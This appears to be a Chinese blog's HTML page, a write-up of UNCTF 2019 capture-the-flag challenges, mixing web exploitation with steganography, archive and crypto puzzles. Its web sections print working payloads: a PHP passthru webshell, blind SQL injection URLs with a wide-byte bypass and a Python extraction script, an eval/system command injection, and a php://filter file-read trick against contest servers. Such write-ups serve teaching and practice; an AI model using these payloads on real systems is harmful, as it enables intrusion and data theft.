@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>UNCTF wp | Damya&#39;s Blog | あややこやや</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="个人ctf竞赛">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="alternate" href="/atom.xml" title="Damya's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Damya</h5>
+          <a href="mailto:397526596@qq.com" title="397526596@qq.com" class="mail">
+            
+              <span>3</span>
+            
+              <span>9</span>
+            
+              <span>7</span>
+            
+              <span>5</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>5</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/DamyaHome" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>UNCTF wp</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">UNCTF wp</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-10-27T09:01:26.000Z" itemprop="datePublished" class="page-time">
+  2019-10-27
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-UNCTF-wp"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">UNCTF wp</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-10-27 17:01:26" datetime="2019-10-27T09:01:26.000Z"  itemprop="datePublished">2019-10-27</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="checkinA-100"><a href="#checkinA-100" class="headerlink" title="checkinA  100"></a>checkinA  100</h2><p>签到题,root用户会给你flag,提交里面的字符串</p>
+<h2 id="Simple-Calc-1-200"><a href="#Simple-Calc-1-200" class="headerlink" title="Simple_Calc_1  200"></a>Simple_Calc_1  200</h2><p>sqlmap跑出来flag,第一个是对的 <figure class="image-box">
+                <a rel=UNCTF wp href="./1.png" title="图片" data-fancybox="images"><img src="./1.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<h2 id="Simple-Calc-2-400"><a href="#Simple-Calc-2-400" class="headerlink" title="Simple_Calc_2  400"></a>Simple_Calc_2  400</h2><p>根据hint在计算的时候抓包,发现可以执行命令,于是试着闭合语句,得到基本payload框架</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">echo</span> ; <span class="comment"># //在 ; # 之间输入命令即可执行</span></span><br></pre></td></tr></table></figure>
+<p>看了下目录下的几个文件源码(发现并没有用)<br>然后在/目录下看到flag.txt</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./2.png" title="图片" data-fancybox="images"><img src="./2.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>用tac命令读取</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./3.png" title="图片" data-fancybox="images"><img src="./3.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="上传给小姐姐的照片-100"><a href="#上传给小姐姐的照片-100" class="headerlink" title="上传给小姐姐的照片  100"></a>上传给小姐姐的照片  100</h2><p>发现可以直接上传php文件,burpsuite抓包开始试探</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//passthru(<span class="string">"ls"</span>);  //能执行</span><br><span class="line">//passthru(<span class="string">"ls /var/www/html"</span>);</span><br><span class="line">passthru(<span class="string">"cat /var/www/html/flag.php"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./4.png" title="图片" data-fancybox="images"><img src="./4.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="NSB-Login-200"><a href="#NSB-Login-200" class="headerlink" title="NSB Login  200"></a>NSB Login  200</h2><p>试探出存在admin用户,burpsuite抓包跑字典(字典要选对,跑了好久)</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./5.png" title="图片" data-fancybox="images"><img src="./5.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="WEB1-100"><a href="#WEB1-100" class="headerlink" title="WEB1  100"></a>WEB1  100</h2><p>我的源码泄露检测小脚本跑出有<a href="http://www.zip文件,下载查看,拖进notepad里看到php代码" target="_blank" rel="noopener">www.zip文件,下载查看,拖进notepad里看到php代码</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">include(<span class="string">"f2f86a5c7e623b54e4685fcc8c503596.php"</span>); </span><br><span class="line">$UN=@$_GET[<span class="string">'un'</span>]; </span><br><span class="line">$CTF=@$_POST[<span class="string">'ctf'</span>]; </span><br><span class="line"><span class="keyword">if</span>($UN==<span class="number">0</span> <span class="keyword">and</span> $UN)&#123; </span><br><span class="line">    echo $flag_ahead; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(is_numeric($CTF))&#123; </span><br><span class="line">    exit(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>($CTF&gt;<span class="number">87654321</span>)&#123; </span><br><span class="line">    echo $flag_behind; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>源码意思是要同时用get传入un=0且post一个ctf&gt;87654321,可以用0a和空数组截断,构造payload<br><figure class="image-box">
+                <a rel=UNCTF wp href="./6.png" title="图片" data-fancybox="images"><img src="./6.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<h2 id="WEB2-100"><a href="#WEB2-100" class="headerlink" title="WEB2  100"></a>WEB2  100</h2><p>上传文件,经过尝试需要上传图片马</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./7.png" title="图片" data-fancybox="images"><img src="./7.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>御剑扫到file.php,访问看到信息意思大概是NSB的数据库,可以用文件包含读取,进行命令注入</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./8.png" title="图片" data-fancybox="images"><img src="./8.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="NSB-Reset-Password-300"><a href="#NSB-Reset-Password-300" class="headerlink" title="NSB Reset Password  300"></a>NSB Reset Password  300</h2><p>逻辑漏洞,整个过程可以分为reset和login,思路是在数据库中覆盖admin密码</p>
+<p>(其实自己做的也很懵,不知道我的过程是不是正确步骤,但是确实做出来了)</p>
+<p>先注册一个admin1用户用来接收验证码</p>
+<p>reset1找回admin用户的密码,邮件发送成功时,burp抓包改user为admin1</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./9.png" title="图片" data-fancybox="images"><img src="./9.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>admin1用户收到验证码,找回密码处修改admin密码</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./10.png" title="图片" data-fancybox="images"><img src="./10.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>回到登录窗,用admin用户和admin1密码登陆成功</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./11.png" title="图片" data-fancybox="images"><img src="./11.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>过后我没复现出来,可能其中有几步我的别的操作不记得了,做出来后我也很懵</p>
+<p>我记得有转换成get让admin用户接收到修改密码的操作,不知道有没有效果</p>
+<p>反正坐等官方wp!</p>
+<h2 id="光坂镇的小诗1-100"><a href="#光坂镇的小诗1-100" class="headerlink" title="光坂镇的小诗1  100"></a>光坂镇的小诗1  100</h2><p>抓包试出 , 被过滤,还要绕过 \ </p>
+<p>转义字符可以用 <code>%df%5c</code> 绕过,逗号可以用 <code>case</code> <code>when()</code> <code>then()</code> <code>else()</code> <code>end</code> 函数绕过</p>
+<p>于是构造payload,根据回显判断真假,读出两个表 flag img</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.94.221.39:8004//index.php?id=6%20%df%27and%20(<span class="keyword">case</span>%20when(ord(mid((select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()%20)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23</span><br></pre></td></tr></table></figure>
+<p>再构造payload从表里读flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.94.221.39:8004//index.php?id=6%20%df%27and%20(<span class="keyword">case</span>%20when(ord(mid((select%20group_concat(flag)from%20flag)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23</span><br></pre></td></tr></table></figure></p>
+<p>在网上随便找了个盲注脚本当注入模板,修修改改……<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://47.94.221.39:8004//index.php?id=6%20%df%27and%20(case%20when(ord(mid((select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()%20)from%20&#123;0&#125;%20for%201))=&#123;1&#125;)%20then%20 1%20else%200%20end)%23"</span></span><br><span class="line">        res = requests.get(url.format(i,k))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'img'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">print</span> chr(k)</span><br></pre></td></tr></table></figure></p>
+<p>最后跑出 flag{q22!sa_web_sql_2245y2g44h}</p>
+<h2 id="光坂镇的小诗2-200"><a href="#光坂镇的小诗2-200" class="headerlink" title="光坂镇的小诗2  200"></a>光坂镇的小诗2  200</h2><p>这题依旧可以用sqlmap跑出来</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./12.png" title="图片" data-fancybox="images"><img src="./12.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>FLAG{Q2GGHA_WEB_SQL_22JKK44H}</p>
+<h2 id="阿风日记-docx-100"><a href="#阿风日记-docx-100" class="headerlink" title="阿风日记.docx  100"></a>阿风日记.docx  100</h2><p>又是一道跑字典的题,burp抓包,这次跑的是弱密码</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./13.png" title="图片" data-fancybox="images"><img src="./13.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="easyphp-100"><a href="#easyphp-100" class="headerlink" title="easyphp  100"></a>easyphp  100</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a = @$_GET[<span class="string">'x'</span>];</span><br><span class="line">    <span class="keyword">if</span>(substr_count($a,<span class="string">"("</span>)&gt;<span class="number">1</span> || substr_count($a,<span class="string">")"</span>)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        die(<span class="string">"only one fun"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strpos($a, <span class="string">'$_GET'</span>)!==<span class="literal">False</span> || strpos($a,<span class="string">'$_POST'</span>)!==<span class="literal">False</span> || strpos($a,<span class="string">'$_COOKIE'</span>)!==<span class="literal">False</span> || strpos($a,<span class="string">"*"</span>!==<span class="literal">False</span>))&#123;</span><br><span class="line">        die(<span class="string">"No No No"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $left = strpos($a, <span class="string">"("</span>);</span><br><span class="line">    $right = strpos($a, <span class="string">")"</span>);</span><br><span class="line">    $len = $right-$left;</span><br><span class="line">    $cmd = substr($a,$left+<span class="number">2</span>,$len<span class="number">-3</span>);</span><br><span class="line">    <span class="keyword">if</span>(strpos($cmd, <span class="string">"cat"</span>)!==<span class="number">0</span> &amp;&amp; strpos($cmd,<span class="string">"cat"</span>)!==<span class="number">1</span> &amp;&amp; strpos($a, <span class="string">"cat"</span>)!== <span class="literal">False</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($cmd)&gt;<span class="number">13</span>)</span><br><span class="line">        &#123;        </span><br><span class="line">            die(<span class="string">"too long"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            echo eval($a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>审计发现eval()函数存在命令执行,需要给x赋值,执行system()函数,并且用%20%20绕过前面的算法,构造payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10043/index.php?x=system(%27%20%20cat%20php%20f*%20%27);</span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./14.png" title="图片" data-fancybox="images"><img src="./14.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="这好像不是上传"><a href="#这好像不是上传" class="headerlink" title="这好像不是上传"></a>这好像不是上传</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.94.221.39:8003/index.php?filename=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure>
+<p>可以用php伪协议读源码<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($filename,<span class="string">"../"</span>)||stristr($filename, <span class="string">"tp"</span>)||stristr($filename,<span class="string">"input"</span>)||stristr($filename,<span class="string">"data"</span>))&#123;</span><br><span class="line">		echo <span class="string">"hacker!"</span>;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($filename,<span class="string">"phar://"</span>))&#123;</span><br><span class="line">		echo <span class="string">"这个函数太危险了,还不能给你用,upload.php也许可以把?也不知道他藏了什么东西在他那里面..."</span>;</span><br><span class="line">		exit();</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($filename,<span class="string">".txt"</span>))&#123;</span><br><span class="line">		echo <span class="string">"这个我做不到,也许upload.php可以帮你,也不知道他藏了什么东西在他那里面..."</span>;</span><br><span class="line">		exit();</span><br><span class="line">                &#125;</span><br><span class="line">    include($filename); </span><br><span class="line">    ?&gt;</span><br><span class="line"><span class="comment"># upload.php</span></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str = <span class="string">"你终于找到了啊"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $upload_name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $tempfile = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $upload_ext = trim(get_extension($upload_name));</span><br><span class="line"> </span><br><span class="line">    $savefile = <span class="string">'./upload/'</span>.md5(time()).<span class="string">'.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span> ($upload_ext == <span class="string">'txt'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(move_uploaded_file($tempfile,$savefile)) &#123;</span><br><span class="line">                die(<span class="string">'Success upload. FileName: '</span>.$savefile);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                die(<span class="string">'Upload failed..'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die(<span class="string">'this is not a txt file..'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function get_extension($file)&#123;</span><br><span class="line">    <span class="keyword">return</span> strtolower(substr($file, strrpos($file, <span class="string">'.'</span>)+<span class="number">1</span>));   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file = $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">''</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">"%s.php"</span>, $file); // 只有php才能被包含</span><br><span class="line">    include($inc);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#something.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$str  = <span class="string">"看我干嘛,我真的啥也没有."</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>LFI漏洞,暂时没复现出来,也没有成功连接后台,唉!</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="快乐游戏题-100"><a href="#快乐游戏题-100" class="headerlink" title="快乐游戏题  100"></a>快乐游戏题  100</h2><figure class="image-box">
+                <a rel=UNCTF wp href="./15.png" title="图片" data-fancybox="images"><img src="./15.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>van就完事了,上课时候做的,只来得及拍照</p>
+<h2 id="亲爱的-100"><a href="#亲爱的-100" class="headerlink" title="亲爱的  100"></a>亲爱的  100</h2><p>完全没想到居然是道社工题,改后缀zip后注释是这个歌在qq音乐2019.7.27 17:47的评论</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./16.png" title="图片" data-fancybox="images"><img src="./16.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>解压得到图片,改后缀zip解压,在word/media目录下看到flag文件</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./17.png" title="图片" data-fancybox="images"><img src="./17.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>UNCTF{W3_L0v3_Unctf}</p>
+<h2 id="长安十二时辰-200"><a href="#长安十二时辰-200" class="headerlink" title="长安十二时辰  200"></a>长安十二时辰  200</h2><figure class="image-box">
+                <a rel=UNCTF wp href="./18.png" title="图片" data-fancybox="images"><img src="./18.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>根据这张图读出ascil码,脚本解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ascil码转字符串或解base64</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line">a=<span class="string">'117 102 115 115 95 121 110 123 99 95 101 125 99 109 95 115 97 116 49 49 48 53'</span></span><br><span class="line">a=a.split(<span class="string">' '</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag=flag+chr(int(i))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># print flag.decode('base64')</span></span><br></pre></td></tr></table></figure>
+<p>得到  ufss_yn{c_e}cm_sat1105<br>再进行栅栏密码解密,提交里面的字符串</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./19.png" title="图片" data-fancybox="images"><img src="./19.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h2 id="贝斯的图-100"><a href="#贝斯的图-100" class="headerlink" title="贝斯的图  100"></a>贝斯的图  100</h2><p>在线base64转码图片,得到二维码,扫描得到base64编码,解码得到flag</p>
+<h2 id="我的头怎么了-100"><a href="#我的头怎么了-100" class="headerlink" title="我的头怎么了  100"></a>我的头怎么了  100</h2><p>修复gif文件头  474946383961</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./20.png" title="图片" data-fancybox="images"><img src="./20.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>要提交半角符号  hhh_it‘s_ea5y</p>
+<h2 id="unctf-平淡日子下面的秘密-100"><a href="#unctf-平淡日子下面的秘密-100" class="headerlink" title="unctf_平淡日子下面的秘密  100"></a>unctf_平淡日子下面的秘密  100</h2><p>拖进stegsolve里,帧里藏有假二维码flag</p>
+<p>提取lsb,勾选位数后三位0,得到zip压缩包</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./21.png" title="图片" data-fancybox="images"><img src="./21.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>用winrar修复后打开flag.txt,密码是在其中的二维码解出来的</p>
+<p>Y0u’re_so_smart,but_it’s_not_the_end</p>
+<p>得到flag</p>
+<h2 id="压缩大礼包-400"><a href="#压缩大礼包-400" class="headerlink" title="压缩大礼包  400"></a>压缩大礼包  400</h2><p>拖进notepad里发现rar头,改后缀解压</p>
+<p>第一层在压缩包备注里,复制到winhex里得到新压缩包</p>
+<p>第二层是zip伪加密,破解得到和里压缩包相同的rename.txt文件</p>
+<p>第三层是明文攻击,用相同crc32文件破解里压缩包</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./22.png" title="图片" data-fancybox="images"><img src="./22.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>第四层是crc32碰撞,可以用脚本跑那几个txt文件,试出密码是welc0me_To_7his_un_ctf__</p>
+<p>第五层是注释不可见字符,复制到sublime里能看到是摩斯密码,解出来是X233$@F99</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./23.png" title="图片" data-fancybox="images"><img src="./23.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>第六层是爆破,foremost分离后需要先修复一下,还好密码比较简单8745</p>
+<p>第七层flag要解一下base64,得到  unctf{D0_y0U_1!kE_rAR_?}</p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="nc-100"><a href="#nc-100" class="headerlink" title="nc  100"></a>nc  100</h2><p>输的足够多就溢出了</p>
+<figure class="image-box">
+                <a rel=UNCTF wp href="./24.png" title="图片" data-fancybox="images"><img src="./24.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="BABYRSA-300"><a href="#BABYRSA-300" class="headerlink" title="BABYRSA  300"></a>BABYRSA  300</h2><p>根据文件套rsa解密模板写脚本</p>
